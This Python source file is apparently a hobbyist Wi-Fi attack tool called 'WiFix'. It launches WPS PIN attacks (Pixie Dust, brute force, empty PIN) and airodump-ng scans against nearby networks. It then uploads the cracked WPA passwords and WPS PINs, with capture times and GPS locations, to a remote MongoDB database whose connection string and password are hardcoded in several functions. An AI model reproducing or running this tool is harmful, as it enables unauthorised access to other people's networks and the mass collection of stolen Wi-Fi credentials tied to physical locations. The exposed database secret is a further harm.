import os, sys, pyrcrack, asyncio
from colorama import Fore
from rich.console import Console
from rich.prompt import Prompt
import pymongo
from pymongo import MongoClient
import time
import json
import requests
import datetime

prefix = f'{Fore.GREEN}[~WX~]{Fore.RESET}'
banner = f'''
{Fore.GREEN}                                                       
 @@@  @@@  @@@                  @@@@@@@@       @@@  @@@  
 @@@  @@@  @@@                  @@@@@@@@       @@@  @@@  
 @@!  @@!  @@!  @@!             @@!       @@!  @@!  !@@  
 !@!  !@!  !@!  !@!             !@!       !@!  !@!  @!!  
 @!!  !!@  @!@       @!@!@!@!@  @!!!:!          !@@!@!   
 !@!  !!!  !@!  @@@  !!!@!@!!!  !!!!!:    @@@    @!!!    
 !!:  !!:  !!:  !!@             !!:       !!@   !: :!!   
 :!:  :!:  :!:  !!:    v1.4     :!:       !!:  :!:  !:!  
  :::: :: :::    ::              ::        ::   ::  :::  
   :: :  : :    :                :        :     :   ::  
{Fore.RESET}
'''

options = '''
                    [1] - WPS attack                 
                    [2] - Aircrack scan
                    [3] - Show wifi data
                    [4] - Upload data
                    [5] - Credit

                    Ctrl + c for exit                    
'''

options1 = '''
                    [1] - Pixie Dust
                    [2] - Pixie Force
                    [3] - Emptypin
                    [4] - Upload Data

                    Ctrl + c for exit                
'''

options2 = '''
                    [1] - All channels
                    [2] - Specific channel

                    Ctrl + c for exit                
'''

options3 = '''

                    [1] - Upload
                    [2] - Manual upload
                    [3] - Convert 
                    [4] - Add geolocation

                    Ctrl + c for exit

'''

def clear():
    name = os.name
    if name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def dust():
    clear()
    print(banner)
    os.system('python3 oneshot.py -K -i wlan0')
    try:
        opt = input(f'{prefix} Press enter (Ctrl + c for main menu): ')
        if opt == '':
            return dust()
        else:
            return dust()
    except KeyboardInterrupt:
         return

def force():
    clear()
    print(banner)
    os.system('python3 oneshot.py -F -i wlan0')
    try:
        opt = input(f'{prefix} Press enter (Ctrl + c for main menu): ')
        if opt == '':
            return force()
        else:
            return force()
    except KeyboardInterrupt:
         return

def emptypin():
    clear()
    print(banner)
    os.system('python3 oneshot.py -p "''" -i wlan0')
    try:
        opt = input(f'{prefix} Press enter (Ctrl + c for main menu): ')
        if opt == '':
            return emptypin()
        else:
            return emptypin()
    except KeyboardInterrupt:
         return
     
def upload():
    clear()
    print(banner)
    print(f"{prefix} Uploading data!")
    try:
        x = requests.get('https://google.com/')
        d = x.status_code
        if d == 200:
            try:
                cluster = MongoClient("mongodb+srv://Androme-data:MalekSulinek69@cluster0.cbybdts.mongodb.net/?retryWrites=true&w=majority")
                db = cluster["WiFix"]
                with open("saved/essid.txt", 'w') as file:
                    for i in os.listdir('saved'):
                        if ".json" in i:
                            i = i.replace(".json", "")
                            file.write(f"{i}\n")
                        else:
                            pass
                file.close()
                try:
                    with open("saved/essid.txt", 'r') as file:
                        lines = file.readlines()
                        line_count = len(lines)
    
                        for i in range(line_count):
                            line = lines[i].strip()
                            coll1 = db[f"{line}"]
                            with open(f"saved/{line}.json", "r") as dataread:
                                data1 = dataread.read()
                                data2 = data1.replace("'", '"')
                                data3 = json.loads(data2)
                                PSK = data3["WPA PSK"]
                                PIN = data3["WPS PIN"]
                                TIME = data3["CATCH DATE"]
                                try:
                                    GPS = data3["GEOLOCATION"]
                                except KeyError:
                                    GPS = ""
                                post = {"WPA PSK": f"{PSK}", "WPS PIN": f"{PIN}", "CATCH DATE": f"{TIME}", "GEOLOCATION": f"{GPS}"}
                            dataread.close()
                            os.remove(f"saved/{line}.json")
                            coll1.insert_one(post)
                            print(f"{prefix} {line} saved succesfully!")
                        file.close()
                        os.remove(f'saved/essid.txt')
                except FileNotFoundError:
                    print(f"{prefix} You have no data to upload!")
                    input(f"{prefix} Press enter to continue!")
         
            except pymongo.errors.ConfigurationError or FileNotFoundError:
                    print(f"{prefix} You have no internet access!")
    except requests.exceptions.ConnectionError :
        print(f"{prefix} No internet access! The data will be sent later.")
    time.sleep(5)
    main()

def addwifi():
    cluster = MongoClient("mongodb+srv://Androme-data:MalekSulinek69@cluster0.cbybdts.mongodb.net/?retryWrites=true&w=majority")
    db = cluster["WiFix"]
    name = input(f'{prefix} Name of WiFi: ')
    coll1 = db[f"{name}"]
    PSK = input(f'{prefix} Password: ')
    PIN = ''
    TIME = datetime.datetime.now()
    GPS = input(f'{prefix} Geolocation of WiFi: ')
    post = {"WPA PSK": f"{PSK}", "WPS PIN": f"{PIN}", "CATCH DATE": f"{TIME}", "GEOLOCATION": f"{GPS}"}
    coll1.insert_one(post)
    print(f'{prefix} WiFi {name} has been added to database')
    time.sleep(5)
    main()

def addgeo():
    cluster = MongoClient("mongodb+srv://Androme-data:MalekSulinek69@cluster0.cbybdts.mongodb.net/?retryWrites=true&w=majority")
    db = cluster["WiFix"]
    coll1 = db.list_collection_names()
    file = open("colls.json", "w")
    file.write("{ ")
    count = 1
    print(f"{prefix} All wifi:\n")
    y = []
    for x in coll1:
        y.append(x)
    y.sort(key=str.lower)
    for x in y:
        print(f"{Fore.YELLOW} {count: <3}|  {x}{Fore.RESET}")
        file.write(f'"{count}": "{x}", "{x}": "{x}", ')
        count += 1
    print('')
    file.write(f'"99999": "Čajovna Želva"' + ' }')
    file.close()
    wifiname = input(f"{prefix} Number of WiFi to change geolocation: ")
    wifiname = str(wifiname)
    with open(f"colls.json", "r") as dataread:
        data = dataread.read()
        result = json.loads(data)
    file.close()
    os.remove("colls.json")
    try:
        wifiname = result[f"{wifiname}"]
    except KeyError:
        print(f"{prefix} Number is not assigned to any WiFi network")
        return showdata()
    collection = db[f"{wifiname}"]
    lokace = input(f"{prefix} Do you want to use your geolocation? [Y/n]: ")
    if lokace == "Y" or lokace == "y":
        try:
            gpsd.connect()
            gpsd.connect(host="127.0.0.1", port=2947)
            print(f"{prefix} GPS connected")
            packet = gpsd.get_current()
            lat = packet.lat
            lon = packet.lon
            geo = f"{lat}, {lon}"
            print(f"{prefix} Using your geolocation {Fore.YELLOW}({packet.lat}, {packet.lon}{Fore.RESET})")
        except ConnectionRefusedError:
            print(f"{prefix} GPS connection Refused [ Try to turn on GPS provider ] ")
    else:
        geo = input(f"{prefix} Geolocation of wifi: ")
    result = collection.find_one()
    myquery = {}
    newvalues = { "$set": { "GEOLOCATION": f"{geo}" } }
    collection.update_one(myquery, newvalues)
    print(f"{prefix} Geolocation of {wifiname} changed to {geo}")
    input(f'{prefix} Press enter to return to main menu: ')
    

def showdata():
    cluster = MongoClient("mongodb+srv://Androme-data:MalekSulinek69@cluster0.cbybdts.mongodb.net/?retryWrites=true&w=majority")
    db = cluster["WiFix"]
    coll1 = db.list_collection_names()
    file = open("colls.json", "w")
    file.write("{ ")
    count = 1
    print(f"{prefix} All wifi:\n")
    y = []
    for x in coll1:
        y.append(x)
    y.sort(key=str.lower)
    for x in y:
        print(f"{Fore.YELLOW} {count: <3}|  {x}{Fore.RESET}")
        file.write(f'"{count}": "{x}", "{x}": "{x}", ')
        count += 1
    print('')
    file.write(f'"99999": "Čajovna Želva"' + ' }')
    file.close()
    wifiname = input(f"{prefix} Number of WiFi to search for: ")
    wifiname = str(wifiname)
    with open(f"colls.json", "r") as dataread:
        data = dataread.read()
        result = json.loads(data)
    file.close()
    os.remove("colls.json")
    try:
        wifiname = result[f"{wifiname}"]
    except KeyError:
        print(f"{prefix} Number is not assigned to any WiFi network")
        return showdata()
    collection = db[f"{wifiname}"]
    result = collection.find_one()
    try:
        PSK = result["WPA PSK"]
        PIN = result["WPS PIN"]
        TIME = result["CATCH DATE"]
        try:
            GPS = result["GEOLOCATION"]
        except KeyError:
            GPS = "None"
    except TypeError:
        print(f'{prefix} WiFi not found')
        time.sleep(1)
        return showdata()
    print(f'''
       Name: {Fore.YELLOW}{wifiname}{Fore.RESET}
       Password: {Fore.YELLOW}{PSK}{Fore.RESET}
       PIN: {Fore.YELLOW}{PIN}{Fore.RESET}
       Time of catch: {Fore.YELLOW}{TIME}{Fore.RESET}
       Geolocation: {Fore.YELLOW}{GPS}{Fore.RESET}
    ''')
    try:
        input(f'{prefix} Enter for return Ctrl + c for main menu: ')
        return showdata()
    except KeyboardInterrupt:
        return main()

def convertfile():
    file = input(f'{prefix} Name of WiFi: ')
    if '.txt' in file:
        try:
            file = open(f'saved/{file}', 'r')
            x = file.readlines()
            x = x[0]
            name2 = x.replace('ESSID: ', '')
            name1 = bytes(f"{name2}", "UTF-8")
            name = name1.replace(b"\n", b"")
            name = str(name)
            name = name.replace("b'", '')
            name = name.replace("'", '')
            x = x[1]
            PSK = x.replace('PASSWORD: ', '')
            file.close()
            filejson = open(f'saved/{name}.json', 'w')
            TIME = datetime.datetime.now()
            filejson.write('{"WPA PSK": ' + f'"{PSK}", ' + '"WPS PIN": "' + f'"unknown", ' +  '"CATCH DATE": ' +  f'"{TIME}"' + "}")
            print(f'{prefix} File {name}.txt has been converted to {name}.json ')
            time.sleep(5)
        except:
            print(f'{prefix} File not found')
    else:
        try:
            file = open(f'saved/{file}.txt', 'r')
            x = file.readlines()
            x = x[0]
            name2 = x.replace('ESSID: ', '')
            name1 = bytes(f"{name2}", "UTF-8")
            name = name1.replace(b"\n", b"")
            name = str(name)
            name = name.replace("b'", '')
            name = name.replace("'", '')
            x = x[1]
            PSK = x.replace('PASSWORD: ', '')
            file.close()
            filejson = open(f'saved/{name}.json', 'w')
            TIME = datetime.datetime.now()
            filejson.write('{"WPA PSK": ' + f'"{PSK}", ' + '"WPS PIN": "' + f'"unknown", ' +  '"CATCH DATE": ' +  f'"{TIME}"' + "}")
            print(f'{prefix} File {name}.txt has been converted to {name}.json ')
            time.sleep(5)
        except FileNotFoundError:
            print(f'{prefix} File not found')

def main():
    try:
        clear()
        print(banner)
        print(options)
        option = input(f'{prefix} Option: ')
        if option == "1":
            clear()
            print(banner)
            print(options1)
            try:
                gpsd.connect()
                gpsd.connect(host="127.0.0.1", port=2947)
                print(f"{prefix} GPS connected")
            except ConnectionRefusedError:
                print(f"{prefix} GPS connection Refused [ Try to turn on GPS provider ] ")
            option1 = input(f'{prefix} Type of attack: ')
            if option1 == "1":
                dust()
            elif option1 == "2":
                force()
            elif option1 == "3":
                emptypin()
            else:
              return
        elif option == "2":
            clear()
            print(banner)
            print(options2)
            option2 = input(f'{prefix} What do you want to scan?: ')
            if option2 == "1":
                os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                os.system("airmon-ng start wlan0 >/dev/null 2>&1")
                try:
                    os.system("airodump-ng -w capture -eg wlan0")
                    os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                except KeyboardInterrupt:
                    os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
            elif option2 == "2":
                channel = input(f"{prefix} What channel should we scan for? [1-99]: ")
                os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                os.system("airmon-ng start wlan0 >/dev/null 2>&1")
                try:
                    save = input('Filename (no name = no save): ')
                    os.system(f"airodump-ng -w channel{channel} --channel {channel} -ig wlan0")
                    os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                except KeyboardInterrupt:
                    os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
            else:
                return
        elif option == "3":
            showdata()
        elif option == "4":
            clear()
            print(banner)
            print(options3)
            uoption = input(f'{prefix} Type of upload: ')
            if uoption == '1':
                upload()
            elif uoption == '2':
                addwifi()
            elif uoption == '3':
                convertfile()
            elif uoption == '4':
                addgeo()
    except KeyboardInterrupt:
        try:
            ki = input(f'\n{prefix} Do you want to exit? [Y/n]: ')
            if ki == 'y':
                os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                sys.exit()
            elif ki == 'Y':
                os.system("airmon-ng stop wlan0 >/dev/null 2>&1")
                sys.exit()
            elif ki == 'n':
                main()
            elif ki == 'N':
                main()
            else:
                main()
        except KeyboardInterrupt:
            return main()
while True:
    main()
    sys.exit
